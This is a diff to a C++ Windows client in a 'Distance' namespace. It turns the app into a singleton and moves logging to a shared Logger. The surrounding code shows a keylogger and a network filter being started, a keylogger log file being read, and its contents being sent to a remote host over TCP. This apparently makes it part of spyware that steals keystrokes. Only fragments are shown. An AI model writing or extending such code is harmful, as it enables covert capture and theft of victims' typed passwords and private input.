@@ -8,16 +8,19 @@ namespace Distance
 
 
 
-    ClientApp* ClientApp::create()
+    ClientApp* ClientApp::getInstance()
     {
-        return app_ = new ClientApp();
+        if (!app_)
+            app_ = new ClientApp();
+        return app_;
     }
 
 
 
     void ClientApp::run()
     {
-        Logger logger(_T("logs/distancelog"));
+        Logger::make()->configure(_T("logs/"));
+
         ClientConfigurator configurator("client_settings.json");
 
         TcpClientSettings settings;
@@ -27,7 +30,7 @@ namespace Distance
         }
         catch (const std::exception& err)
         {
-            logger << "Client configurator error: " << err.what() << "\n";
+            Logger::make()->writeln("Client configurator error: ", err.what());
             return;
         }
  
@@ -38,7 +41,7 @@ namespace Distance
         }
         catch (const xstar::WinAPIException& err)
         {
-            logger << "Keylogger error: " << err.what() << "\n";
+            Logger::make()->writeln("Keylogger error: ", err.what());
             return;
         }
 
@@ -49,9 +52,10 @@ namespace Distance
         }
         catch (const xstar::WinAPIException& err)
         {
-            logger << "Netfilter error: " << err.what() << "\n";
+            Logger::make()->writeln("Netfilter error: ", err.what());
             return;
         }
+
         try
         {
             xstar::SmartHandle logfile = CreateFileA(
@@ -112,7 +116,7 @@ namespace Distance
                         nullptr
                     );
                     if (!isSuccess)
-                        logger << "Failed to read keylogger log file...";
+                        Logger::make()->writeln("Failed to read keylogger log file...");
 
                     mainBuffer_.get()[bytes ? bytes - 1 : 0] = L'\0';
                     client_->dataSend(mainBuffer_.get(), MainBufferSize / sizeof(wchar_t));
@@ -163,7 +167,7 @@ namespace Distance
         }
         catch (const std::exception& error)
         {
-            logger << error.what() << "\n";
+            Logger::make()->writeln(error.what());
         }
     }
 
